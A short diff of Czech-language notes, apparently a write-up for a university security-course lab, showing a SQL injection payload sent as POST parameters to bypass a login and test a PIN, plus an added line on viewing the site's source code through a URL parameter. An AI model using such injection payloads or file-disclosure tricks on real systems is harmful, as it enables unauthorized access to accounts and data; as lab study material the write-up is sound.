@@ -44,4 +44,7 @@ Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin l
 **Ověření pinu:**<br />
 main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5517' OR '&password=");<br />
 
+## Zobrazení zdrojového kódu
+Po přihlášení lze zobrazit zdrojový kód na adrese https://kbe.felk.cvut.cz/index.php?open=index.php <br />
+
 
